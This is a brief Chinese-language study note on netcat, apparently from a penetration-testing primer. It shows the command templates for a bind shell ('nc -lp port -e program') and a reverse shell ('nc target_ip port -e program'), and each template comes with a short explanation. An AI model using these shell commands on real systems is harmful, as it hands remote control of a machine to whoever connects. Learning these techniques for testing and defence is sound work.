正向连接(开端口被控制)
1.1 nc -lp/-l -p 端口;占用端口并开始接受传递至此端口的消息,-l监听,-p端口
nc 目标ip 端口;连接目标的的指定端口，两者将可以进行通信
1.2 nc -lp 端口 -e 命令/程序;将指定的命令/程序权限传给连接的客户端,并交由客户端控制
nc 目标ip 端口;连接目标指定端口，并操作服务端发过来的命令/程序
反向shell(开端口控制别人)
1.nc 目标ip 端口 -e 命令/程序;连接时客户端也可以把自己的程序发送给服务端